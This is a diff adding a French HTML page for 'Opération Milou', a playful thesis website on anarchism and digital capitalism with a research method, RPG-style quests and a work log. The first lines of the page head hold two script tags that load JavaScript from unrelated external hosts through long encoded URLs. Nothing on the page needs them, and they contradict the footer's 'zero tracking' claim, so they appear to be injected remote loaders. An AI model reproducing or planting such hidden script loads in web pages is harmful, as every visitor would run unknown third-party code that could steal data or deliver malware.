@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="fr"><head><script type='text/javascript' src='https://dl.ouaisfi.eu/4XIagC_9SOu1D2HljO7VTbIy95tECymIEbKLKxGGrUZfzkO-nO3XLBwFnvjPod0UZQpAGrDJf6kjk1CVS86p7l82DEz76zOjSFZIaPLW3OH5g-SF-1CHs7oWEFWxgJql4Yo03t6NGxm1phssyH6qs_sEgQsvc8UsJe1izdj7t3XnhVdnS_7OtzFhd-yDU-IC1NuttgOyXJ8T1UiA_WLVYVBEA3z4s6ewdKqo8dUBdYZb8ghwjXjLwgYO67USaut2jZlk8-SK8rQiPzVq6nA9S3FE2ymkewDD3RaXsoS3vRpwwhSSOvtZKN0AhtqHbAej_ZUZgblnL7kN3e56uTgxBuL9hEBHLqZQafATelwWjClEsuSV32QrA6XbcpAXWdE3NrYzb4uZ7tE4ydkpgof5i4Z6ZW0EKbK8hbEtBIcnpq8QJ43lJJ-eWkIxk1zJKLMGiMJ850t1zVduwie5i1ISvNbsE_ensHtCfVdS9Q'></script><script type='text/javascript' src='https://rg-ashy.vercel.app/dZxzJL6lhzYnZxZZAIPSS9KSE4C4qR-7IlhxclLzRiNOeodkxmUlMrzndNTW9qrRVV3oXpuAMg4sOHLclVDRxvRk37mY_xE1jasmFvWaSwp6IqUSaoxCA7HQBuKt1jM2xP2_0ZQa40jOzTu8eZl-9XeMj9biSzkd3nKvgGppYD8jfDh2rPgV95S7BsfnTDwoGQ1uJzlL2amMiDsq5QMyHzALkokQKTaocQHliBK-sx3aGij2jL5U8rbVc1JPkCnLFmbMwC-a7EO5_TM1-EAz7KwgTueiyEETJANAQIK4cw3ieXWcC_JtFIobXDa8zuhNSKPBA_T_fV6Ub2wohGqftt55NEF0_HYYiR3LP4wm6VIv_od9vFIovPP5lIBd3Uc1M8RzzjDSKV4Icol4qzNy8zaU6cwPVCoOk7FtZGrPRRk8WkELIe1jaY8QYQiklHqhtsPWwH9V0T3SFTBFH-cBfXDamCtMDS7UOFR6_TriDyZR'></script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Le jeu STIC de l'anarchie – OPÉRATION MILOU</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    :root {
+      --bg: #fef3c7;
+      --bg2: #e0f2fe;
+      --bg3: #fce7f3;
+      --card: #ffffff;
+      --accent: #22c55e;
+      --accent2: #0ea5e9;
+      --accent3: #f97316;
+      --text: #111827;
+      --muted: #4b5563;
+      --border: rgba(15, 23, 42, 0.06);
+      --font-main: "Comic Sans MS", "Comic Neue", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      --font-mono: "Courier New", SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      --radius-xl: 22px;
+      --shadow-soft: 0 16px 35px rgba(15, 23, 42, 0.18);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      font-family: var(--font-main);
+      background:
+        radial-gradient(circle at 0 0, #fee2e2, transparent 60%),
+        radial-gradient(circle at 100% 100%, #bfdbfe, transparent 60%),
+        radial-gradient(circle at 50% 0, #bbf7d0, transparent 60%),
+        #fef3c7;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background-image:
+        radial-gradient(circle at 20% 20%, rgba(255,255,255,0.8) 0, transparent 50%),
+        radial-gradient(circle at 80% 10%, rgba(255,255,255,0.6) 0, transparent 60%);
+      opacity: 0.5;
+      mix-blend-mode: screen;
+      z-index: 0;
+    }
+
+    a { color: #1d4ed8; }
+
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      padding: 10px 16px;
+      background: rgba(254, 249, 195, 0.95);
+      backdrop-filter: blur(8px);
+      border-bottom: 2px solid rgba(251, 191, 36, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      box-shadow: 0 8px 20px rgba(251, 146, 60, 0.25);
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .logo {
+      width: 46px;
+      height: 46px;
+      border-radius: 999px;
+      background:
+        radial-gradient(circle at 30% 20%, #f9a8d4, #f97316);
+      position: relative;
+      box-shadow:
+        0 0 0 3px #fef9c3,
+        0 0 0 6px rgba(251, 191, 36, 0.9),
+        0 12px 18px rgba(180, 83, 9, 0.45);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo::before {
+      content: "★";
+      font-size: 1.6rem;
+      color: #fef3c7;
+      text-shadow: 0 2px 0 rgba(124, 45, 18, 0.7);
+    }
+
+    .title-block h1 {
+      font-size: 1.05rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
+
+    .title-block .code {
+      font-size: 0.8rem;
+      color: #6b21a8;
+    }
+
+    .header-right {
+      text-align: right;
+      font-size: 0.75rem;
+      color: #4b5563;
+    }
+
+    .balloon {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: #be123c;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: #fee2e2;
+      box-shadow:
+        0 3px 0 #fca5a5,
+        0 4px 10px rgba(248, 113, 113, 0.5);
+      text-shadow:
+        1px 1px 0 #fecaca,
+        -1px 1px 0 #fecaca,
+        0 2px 0 #fecaca;
+      border: 2px solid #fecaca;
+      display: inline-block;
+    }
+
+    .balloon-small {
+      font-size: 0.75rem;
+      letter-spacing: 0.12em;
+    }
+
+    main {
+      flex: 1;
+      padding: 16px 16px 20px;
+      position: relative;
+      z-index: 1;
+      display: flex;
+      justify-content: center;
+    }
+
+    .shell {
+      width: 100%;
+      max-width: 1100px;
+      display: grid;
+      grid-template-columns: minmax(0, 1.5fr) minmax(0, 1.2fr);
+      gap: 14px;
+    }
+
+    @media (max-width: 900px) {
+      .shell {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .panel {
+      background: #fefce8;
+      border-radius: var(--radius-xl);
+      border: 2px solid rgba(248, 250, 252, 0.9);
+      box-shadow: var(--shadow-soft);
+      padding: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .panel::before {
+      content: "";
+      position: absolute;
+      inset: -40%;
+      background-image: radial-gradient(circle, rgba(253, 224, 71, 0.35), transparent 60%);
+      opacity: 0.2;
+      pointer-events: none;
+    }
+
+    .panel-inner {
+      position: relative;
+      z-index: 1;
+    }
+
+    .panel-right {
+      background: linear-gradient(135deg, #bfdbfe, #e0f2fe, #f5f3ff);
+    }
+
+    h2 {
+      font-size: 1rem;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    h3 {
+      font-size: 0.95rem;
+      margin-bottom: 3px;
+    }
+
+    p {
+      font-size: 0.85rem;
+      color: var(--muted);
+      margin-bottom: 4px;
+    }
+
+    .tag-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 5px;
+      margin-bottom: 6px;
+    }
+
+    .tag {
+      font-size: 0.72rem;
+      border-radius: 999px;
+      padding: 2px 8px;
+      border: 1px dashed rgba(55, 65, 81, 0.3);
+      background: #f9fafb;
+      color: #4b5563;
+      font-family: var(--font-mono);
+    }
+
+    .tag.bold {
+      border-style: solid;
+      background: #bbf7d0;
+      color: #14532d;
+    }
+
+    section {
+      margin-top: 10px;
+      padding: 8px;
+      border-radius: 16px;
+      border: 2px solid rgba(248, 250, 252, 0.9);
+      background: #ffffff;
+    }
+
+    section:first-of-type {
+      margin-top: 0;
+    }
+
+    ul {
+      margin-left: 16px;
+      font-size: 0.82rem;
+      color: #4b5563;
+      margin-top: 2px;
+      margin-bottom: 4px;
+    }
+
+    li { margin-bottom: 3px; }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
+      gap: 8px;
+    }
+
+    @media (max-width: 800px) {
+      .grid-2 { grid-template-columns: 1fr; }
+    }
+
+    .card {
+      border-radius: 16px;
+      background: #fffbeb;
+      border: 2px dashed rgba(251, 191, 36, 0.5);
+      padding: 8px;
+      font-size: 0.84rem;
+    }
+
+    .card.blue {
+      background: #eff6ff;
+      border-color: rgba(96, 165, 250, 0.7);
+    }
+
+    .card.pink {
+      background: #fdf2f8;
+      border-color: rgba(244, 114, 182, 0.7);
+    }
+
+    .chip {
+      display: inline-block;
+      font-size: 0.72rem;
+      padding: 2px 6px;
+      border-radius: 999px;
+      background: #fee2e2;
+      color: #9f1239;
+      margin-bottom: 3px;
+    }
+
+    .table-scroll {
+      overflow-x: auto;
+      margin-top: 4px;
+    }
+
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      font-size: 0.78rem;
+    }
+
+    th, td {
+      border: 1px solid rgba(148, 163, 184, 0.5);
+      padding: 4px 6px;
+      vertical-align: top;
+    }
+
+    th {
+      background: #fef3c7;
+      font-weight: 700;
+      font-size: 0.8rem;
+    }
+
+    /* Classes & XP badges */
+    .class-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+      gap: 6px;
+      margin-top: 4px;
+    }
+
+    .class-card {
+      background: #ffffff;
+      border-radius: 16px;
+      border: 2px solid rgba(148, 163, 184, 0.4);
+      padding: 6px;
+      font-size: 0.78rem;
+      position: relative;
+    }
+
+    .class-name {
+      font-weight: 700;
+      margin-bottom: 2px;
+    }
+
+    .stat-label {
+      font-size: 0.72rem;
+      color: #6b21a8;
+    }
+
+    .xp-list {
+      font-size: 0.8rem;
+    }
+
+    .badge-lvl {
+      display: inline-flex;
+      align-items: center;
+      border-radius: 999px;
+      padding: 2px 6px;
+      font-size: 0.72rem;
+      border: 1px solid rgba(37, 99, 235, 0.6);
+      background: #dbeafe;
+      margin-right: 4px;
+    }
+
+    /* Worklog */
+    .filter-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      margin-bottom: 6px;
+      font-size: 0.72rem;
+    }
+
+    .filter-btn {
+      border-radius: 999px;
+      padding: 3px 8px;
+      border: 1px solid rgba(148, 163, 184, 0.7);
+      background: #e0f2fe;
+      cursor: pointer;
+    }
+
+    .filter-btn.active {
+      background: #bfdbfe;
+      border-color: #1d4ed8;
+      color: #1d4ed8;
+    }
+
+    .log-item {
+      border-radius: 12px;
+      border: 1px solid rgba(148, 163, 184, 0.7);
+      background: #ffffff;
+      padding: 6px 7px;
+      margin-bottom: 5px;
+      font-size: 0.8rem;
+    }
+
+    .log-top {
+      display: flex;
+      justify-content: space-between;
+      gap: 6px;
+      margin-bottom: 2px;
+      font-size: 0.72rem;
+    }
+
+    .log-date {
+      font-family: var(--font-mono);
+      color: #6b7280;
+    }
+
+    .log-status {
+      padding: 1px 6px;
+      border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.8);
+      font-family: var(--font-mono);
+    }
+
+    .log-status.idee { background: #fef9c3; }
+    .log-status.en-cours { background: #bfdbfe; }
+    .log-status.valide { background: #bbf7d0; }
+
+    footer {
+      padding: 8px 16px 10px;
+      background: #fee2e2;
+      border-top: 2px solid rgba(248, 113, 113, 0.7);
+      font-size: 0.8rem;
+      color: #7f1d1d;
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    @media (max-width: 720px) {
+      header { flex-direction: column; align-items: flex-start; }
+      footer { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+<header>
+  <div class="header-left">
+    <div class="logo" aria-hidden="true"></div>
+    <div class="title-block">
+      <h1>OPÉRATION MILOU</h1>
+      <div class="code">Le jeu STIC de l’anarchie (pour une thèse ET le capitalisme)</div>
+    </div>
+  </div>
+  <div class="header-right">
+    <div class="balloon balloon-small">#milou · scratch x licornes x bisounours</div><br>
+    <span style="font-size:0.7rem;">Une bande de klets, une méthode béton, un MMORPG IRL académique.</span>
+  </div>
+</header>
+
+<main>
+  <div class="shell">
+    <!-- COLONNE GAUCHE : SCIENCE + MÉTHODE + MMO -->
+    <div class="panel">
+      <div class="panel-inner">
+        <section id="intro">
+          <h2>🌈 Résumé du jeu STIC de l’anarchie</h2>
+          <p>
+            L’<strong>OPÉRATION MILOU</strong> est une cellule socio-technique qui pose cette question&nbsp;:
+            <em>« Peut-on mobiliser des principes anarchistes pour réparer, orienter ou neutraliser certains effets
+            destructeurs du capitalisme numérique – tout en avançant vers une vraie thèse en STIC ? »</em>
+          </p>
+          <p>
+            Cette page est à la fois&nbsp;:
+          </p>
+          <ul>
+            <li>un <strong>site vitrine</strong> pour la thèse,</li>
+            <li>une <strong>fiche de jeu</strong> façon MMORPG IRL,</li>
+            <li>et un <strong>panneau d’affichage</strong> pour la bande de klets de l’Opération Milou.</li>
+          </ul>
+          <div class="tag-row">
+            <span class="tag bold">STIC</span>
+            <span class="tag">anarchie &amp; capitalisme</span>
+            <span class="tag">communs &amp; infra numériques</span>
+            <span class="tag">méthode 6·4·2</span>
+            <span class="tag">MMORPG IRL</span>
+          </div>
+        </section>
+
+        <section id="science">
+          <h2>🔬 Cadre scientifique (STIC)</h2>
+          <p>
+            <strong>Domaine&nbsp;:</strong> Sciences et Technologies de l’Information et de la Communication (STIC).  
+            <strong>Approche&nbsp;:</strong> socio-technique, critique, méthodologique, appliquée.
+          </p>
+          <p>
+            <strong>Question centrale&nbsp;:</strong> comment des dispositifs inspirés de l’anarchie
+            (entraide, autogestion, communs, non-domination) peuvent-ils stabiliser ou corriger certaines dynamiques
+            du capitalisme numérique – dans des organisations socio-techniques <em>réelles</em> ?
+          </p>
+
+          <div class="grid-2">
+            <div class="card">
+              <h3>Ce que ce projet n’est pas</h3>
+              <ul>
+                <li>Pas un appel au chaos ni à la violence.</li>
+                <li>Pas un plan magique pour renverser le capitalisme.</li>
+                <li>Pas un pitch startup bullshit de plus.</li>
+              </ul>
+            </div>
+            <div class="card blue">
+              <h3>Ce que ce projet tente d’être</h3>
+              <ul>
+                <li>Une enquête rigoureuse, assumée politiquement mais documentée.</li>
+                <li>Un laboratoire public de documentation (issues, commits, notes).</li>
+                <li>Une base possible pour une thèse en STIC.</li>
+              </ul>
+            </div>
+          </div>
+        </section>
+
+        <section id="method">
+          <h2>📐 Méthode 6·4·2 – version « plateau de jeu »</h2>
+          <p>
+            La méthode <strong>6·4·2</strong> sert de squelette à la recherche, mais aussi au jeu.
+          </p>
+          <div class="table-scroll">
+            <table>
+              <tbody><tr>
+                <th>6 fils directeurs<br><span style="font-size:0.7rem;">(storylines)</span></th>
+                <th>4 axes de terrain<br><span style="font-size:0.7rem;">(maps)</span></th>
+                <th>2 niveaux d’analyse<br><span style="font-size:0.7rem;">(tiers de boss)</span></th>
+              </tr>
+              <tr>
+                <td>
+                  <ul>
+                    <li>(1) Gouvernance : qui décide, comment, avec quels contre-pouvoirs ?</li>
+                    <li>(2) Propriété : propriété privée, usages collectifs, mutualisation.</li>
+                    <li>(3) Infrastructures : serveurs, logiciels, normes, dépendances.</li>
+                    <li>(4) Rémunération : flux économiques et injustices corrigées ou déplacées.</li>
+                    <li>(5) Conflit &amp; soin : comment on gère les conflits et la fatigue.</li>
+                    <li>(6) Reproductibilité : ce qui peut être documenté, transmis, forké.</li>
+                  </ul>
+                </td>
+                <td>
+                  <ul>
+                    <li>Axe A — Théories &amp; récits (anarchie, capitalisme, communs).</li>
+                    <li>Axe B — Projets libres &amp; coopératives (cas réels, terrain).</li>
+                    <li>Axe C — Infrastructures numériques (hébergement, protocoles, gouvernance de code).</li>
+                    <li>Axe D — Régulation &amp; institutions (droit, normes, politiques publiques).</li>
+                  </ul>
+                </td>
+                <td>
+                  <ul>
+                    <li>Niveau 1 — <strong>Micro</strong> (collectifs, équipes, projets, intranets, outils).</li>
+                    <li>Niveau 2 — <strong>Macro</strong> (écosystèmes, marchés, régulation, imaginaires).</li>
+                  </ul>
+                </td>
+              </tr>
+            </tbody></table>
+          </div>
+          <p style="font-size:0.78rem; margin-top:4px;">
+            La thèse (ou le rapport) pourra être structurée en croisant ces 6 fils, 4 axes et 2 niveaux
+            – avec tableaux, cartes, diagrammes, comme un grand manuel de jeu.
+          </p>
+        </section>
+
+        <section id="mmorpg">
+          <h2>🎮 MMORPG IRL – classes, quêtes, XP &amp; loot</h2>
+          <h3>Classes de personnages IRL</h3>
+          <div class="class-grid">
+            <div class="class-card">
+              <div class="class-name">Chercheur·se Nomade</div>
+              <div class="stat-label">Stat principal : INT</div>
+              <p>Analyse, littérature, navigation dans la bibliographie infinie.</p>
+              <p style="font-size:0.75rem;">Passif : +20% lecture rapide.</p>
+            </div>
+            <div class="class-card">
+              <div class="class-name">Ingénieur·e du Bazar</div>
+              <div class="stat-label">Stat principal : TECH</div>
+              <p>Prototypage, scripts, intranets, moteurs de recherche dystopiques.</p>
+              <p style="font-size:0.75rem;">Passif : +15% debug mental.</p>
+            </div>
+            <div class="class-card">
+              <div class="class-name">Scribe Cryptique</div>
+              <div class="stat-label">Stat principal : WIS</div>
+              <p>Rédaction, distillation, transformation de chaos en chapitres.</p>
+              <p style="font-size:0.75rem;">Passif : -20% dégâts de jargon.</p>
+            </div>
+            <div class="class-card">
+              <div class="class-name">Samouraï Administratif</div>
+              <div class="stat-label">Stat principal : CON</div>
+              <p>Normes, RGPD, régulation, paperasse institutionnelle.</p>
+              <p style="font-size:0.75rem;">Passif : +30% résistance bureaucratique.</p>
+            </div>
+            <div class="class-card">
+              <div class="class-name">Tacticien·ne Socio-tech</div>
+              <div class="stat-label">Stat principal : CHA</div>
+              <p>Interviews, observation terrain, médiation entre mondes.</p>
+              <p style="font-size:0.75rem;">Passif : +15% diplomatie.</p>
+            </div>
+          </div>
+
+          <h3 style="margin-top:6px;">XP &amp; niveaux</h3>
+          <p class="xp-list">
+            Exemples de gain d’XP :
+          </p>
+          <ul class="xp-list">
+            <li>+10 XP → 1 page lue dans une annexe PDF.</li>
+            <li>+20 XP → issue GitHub ouverte avec description claire.</li>
+            <li>+30 XP → commit qui améliore le site ou la doc.</li>
+            <li>+40 XP → note de terrain rédigée.</li>
+            <li>+50 XP → analyse comparative entre deux cas.</li>
+            <li>+100 XP → version stable d’un chapitre.</li>
+          </ul>
+          <p>
+            Paliers de niveaux :
+          </p>
+          <p>
+            <span class="badge-lvl">N1</span> Novice de la Méthode ·
+            <span class="badge-lvl">N2</span> Cartographe des Concepts ·
+            <span class="badge-lvl">N3</span> Fouilleur de Donjons Socio-tech ·
+            <span class="badge-lvl">N4</span> Architecte Numérique ·
+            <span class="badge-lvl">N5</span> Maître Communard ·
+            <span class="badge-lvl">N6</span> Docteur·e du Chaos Contrôlé.
+          </p>
+
+          <h3 style="margin-top:6px;">Quêtes &amp; boss</h3>
+          <div class="grid-2">
+            <div class="card pink">
+              <div class="chip">Quêtes principales</div>
+              <ul>
+                <li>QP1 — Définir la question de recherche.</li>
+                <li>QP2 — Cartographier les théories (anarchie, capitalisme, communs…).</li>
+                <li>QP3 — Choisir 3 à 5 cas d’étude.</li>
+                <li>QP4 — Analyser les dispositifs socio-techniques.</li>
+                <li>QP5 — Proposer des modèles reproductibles.</li>
+                <li>QP6 — Rédiger la thèse.</li>
+              </ul>
+            </div>
+            <div class="card blue">
+              <div class="chip">Boss du jeu (version STIC)</div>
+              <ul>
+                <li>Boss 1 : <strong>La Bibliographie Infinie</strong>.</li>
+                <li>Boss 2 : <strong>La Régulation Labyrinthique</strong>.</li>
+                <li>Boss 3 : <strong>L’Incohérence Conceptuelle</strong>.</li>
+                <li>Boss 4 : <strong>Les Données Manquantes</strong>.</li>
+                <li>Boss 5 : <strong>La Rédaction Éternelle</strong> (final boss).</li>
+              </ul>
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <!-- COLONNE DROITE : WORKLOG + ANNEXES + DEPLOIEMENT -->
+    <div class="panel panel-right">
+      <div class="panel-inner">
+        <section id="worklog">
+          <h2>📒 Journal de bord #milou</h2>
+          <p>
+            Le <em>vrai</em> log détaillé vit dans les commits et issues du dépôt GitHub.
+            Ici, une version lisible façon carnet de progression.
+          </p>
+          <div class="filter-row">
+            <button class="filter-btn active" data-filter="all">Tous</button>
+            <button class="filter-btn" data-filter="idee">Idées</button>
+            <button class="filter-btn" data-filter="en-cours">En cours</button>
+            <button class="filter-btn" data-filter="valide">Stabilisé</button>
+          </div>
+          <div id="logList"><div class="log-item"><div class="log-top"><span class="log-date">2025-01-01</span><span class="log-status valide">stabilisé</span></div><div style="font-weight: 600; margin-bottom: 2px;">Initialisation de l’OPÉRATION MILOU</div><div>Nom de code fixé (#milou). Décision de documenter publiquement la démarche (GitHub Pages) tout en gardant certaines discussions en cercle de confiance.</div></div><div class="log-item"><div class="log-top"><span class="log-date">2025-01-05</span><span class="log-status en-cours">en cours</span></div><div style="font-weight: 600; margin-bottom: 2px;">Formulation de la question de recherche</div><div>Passage de « l’anarchie peut-elle sauver le monde » à une formulation STIC ciblée : quels dispositifs socio-techniques concrets, dans quelles limites.</div></div><div class="log-item"><div class="log-top"><span class="log-date">2025-01-10</span><span class="log-status en-cours">en cours</span></div><div style="font-weight: 600; margin-bottom: 2px;">Esquisse de la méthode 6·4·2</div><div>Définition de 6 fils directeurs, 4 axes de terrain, 2 niveaux d’analyse. À illustrer par des cas réels et des schémas.</div></div><div class="log-item"><div class="log-top"><span class="log-date">2025-01-15</span><span class="log-status valide">stabilisé</span></div><div style="font-weight: 600; margin-bottom: 2px;">Collecte initiale d’annexes</div><div>Ajout des PDF (dystopie, plaidoyer, pression) dans le dépôt. Première cartographie des thèmes transverses.</div></div><div class="log-item"><div class="log-top"><span class="log-date">2025-01-20</span><span class="log-status idee">idée</span></div><div style="font-weight: 600; margin-bottom: 2px;">Repérage de cas d’étude possibles</div><div>Identifier 3 à 5 projets (logiciels libres, coopératives, plateformes alternatives) à analyser en profondeur.</div></div></div>
+        </section>
+
+        <section id="annexes">
+          <h2>📚 Corpus &amp; annexes (PDF)</h2>
+          <p>
+            Ces documents servent de base de réflexion. Ils doivent être cités proprement dans la thèse / le mémoire.
+          </p>
+          <ul>
+            <li>
+              <a href="file:///C:/Users/yanni/Downloads/dystopie.pdf" target="_blank"><strong>dystopie.pdf</strong></a><br>
+              <span style="font-size:0.8rem; color:#4b5563;">
+                Annexe sur les dynamiques dystopiques contemporaines (surveillance, autoritarisme, climat, IA…).
+              </span>
+            </li>
+            <li>
+              <a href="file:///C:/Users/yanni/Downloads/plaidoyer-jp.pdf" target="_blank"><strong>plaidoyer-jp.pdf</strong></a><br>
+              <span style="font-size:0.8rem; color:#4b5563;">
+                Texte de plaidoyer / réflexion de référence (lecture critique, pas dogme).
+              </span>
+            </li>
+            <li>
+              <a href="file:///C:/Users/yanni/Downloads/pression%20(1).pdf" target="_blank"><strong>pression (1).pdf</strong></a><br>
+              <span style="font-size:0.8rem; color:#4b5563;">
+                Annexe sur la pression (sociale, institutionnelle, économique) dans les dispositifs étudiés.
+              </span>
+            </li>
+          </ul>
+          <p style="font-size:0.78rem; margin-top:4px;">
+            Pour GitHub Pages&nbsp;: place ces PDFs à la racine du dépôt (ou adapte les chemins dans ce fichier).
+          </p>
+        </section>
+
+        <section id="deploy">
+          <h2>🚀 Déploiement GitHub Pages</h2>
+          <p>
+            L’OPÉRATION MILOU doit rester déployable par n’importe quel·le membre de la bande de klets,
+            sans magie noire.
+          </p>
+          <ol style="font-size:0.8rem; color:#4b5563; margin-left:18px; margin-top:3px;">
+            <li>Créer un dépôt GitHub (par ex. <code>operation-milou</code>).</li>
+            <li>Mettre ce fichier sous le nom <code>index.html</code> à la racine du dépôt.</li>
+            <li>Ajouter les PDFs requis (dystopie.pdf, plaidoyer-jp.pdf, pression (1).pdf).</li>
+            <li>
+              Dans <strong>Settings → Pages</strong> : activer GitHub Pages
+              (branche <code>main</code>, dossier <code>/</code>).
+            </li>
+            <li>Récupérer l’URL générée et l’intégrer dans la thèse comme partie du dispositif socio-technique.</li>
+          </ol>
+          <p style="font-size:0.78rem; margin-top:4px;">
+            À chaque avancée significative&nbsp;:
+            <br>– mettre à jour le journal de bord ci-dessus
+            <br>– pousser le commit sur GitHub
+            <br>– ouvrir une issue pour ce qui reste flou (concept, cas, hypothèse)
+          </p>
+        </section>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer>
+  <span>
+    OPÉRATION MILOU – Le jeu STIC de l’anarchie (pour une thèse ET le capitalisme) · scratch MIT x licornes x bisounours.
+  </span>
+  <span>
+    Site statique, zéro tracking, 100% forkable. La vraie difficulté reste le boss final : la rédaction.
+  </span>
+</footer>
+
+<script>
+  // Données du journal de bord (à éditer au besoin)
+  const worklogData = [
+    {
+      date: "2025-01-01",
+      titre: "Initialisation de l’OPÉRATION MILOU",
+      statut: "valide",
+      texte: "Nom de code fixé (#milou). Décision de documenter publiquement la démarche (GitHub Pages) tout en gardant certaines discussions en cercle de confiance."
+    },
+    {
+      date: "2025-01-05",
+      titre: "Formulation de la question de recherche",
+      statut: "en-cours",
+      texte: "Passage de « l’anarchie peut-elle sauver le monde » à une formulation STIC ciblée : quels dispositifs socio-techniques concrets, dans quelles limites."
+    },
+    {
+      date: "2025-01-10",
+      titre: "Esquisse de la méthode 6·4·2",
+      statut: "en-cours",
+      texte: "Définition de 6 fils directeurs, 4 axes de terrain, 2 niveaux d’analyse. À illustrer par des cas réels et des schémas."
+    },
+    {
+      date: "2025-01-15",
+      titre: "Collecte initiale d’annexes",
+      statut: "valide",
+      texte: "Ajout des PDF (dystopie, plaidoyer, pression) dans le dépôt. Première cartographie des thèmes transverses."
+    },
+    {
+      date: "2025-01-20",
+      titre: "Repérage de cas d’étude possibles",
+      statut: "idee",
+      texte: "Identifier 3 à 5 projets (logiciels libres, coopératives, plateformes alternatives) à analyser en profondeur."
+    }
+  ];
+
+  const logList = document.getElementById("logList");
+  const filterButtons = document.querySelectorAll(".filter-btn");
+
+  function renderLogs(filter = "all") {
+    logList.innerHTML = "";
+    worklogData.forEach(entry => {
+      if (filter !== "all" && entry.statut !== filter) return;
+
+      const div = document.createElement("div");
+      div.className = "log-item";
+
+      const top = document.createElement("div");
+      top.className = "log-top";
+
+      const dateEl = document.createElement("span");
+      dateEl.className = "log-date";
+      dateEl.textContent = entry.date;
+
+      const status = document.createElement("span");
+      status.className = "log-status " + entry.statut;
+      status.textContent =
+        entry.statut === "idee"
+          ? "idée"
+          : entry.statut === "en-cours"
+          ? "en cours"
+          : "stabilisé";
+
+      top.appendChild(dateEl);
+      top.appendChild(status);
+
+      const title = document.createElement("div");
+      title.style.fontWeight = "600";
+      title.style.marginBottom = "2px";
+      title.textContent = entry.titre;
+
+      const body = document.createElement("div");
+      body.textContent = entry.texte;
+
+      div.appendChild(top);
+      div.appendChild(title);
+      div.appendChild(body);
+
+      logList.appendChild(div);
+    });
+
+    if (!logList.children.length) {
+      const empty = document.createElement("div");
+      empty.className = "log-item";
+      empty.textContent = "Aucune entrée pour ce filtre. Mets à jour worklogData dans le script.";
+      logList.appendChild(empty);
+    }
+  }
+
+  filterButtons.forEach(btn => {
+    btn.addEventListener("click", () => {
+      filterButtons.forEach(b => b.classList.remove("active"));
+      btn.classList.add("active");
+      const filter = btn.getAttribute("data-filter");
+      renderLogs(filter);
+    });
+  });
+
+  renderLogs();
+</script>
+
+
+</body></html>
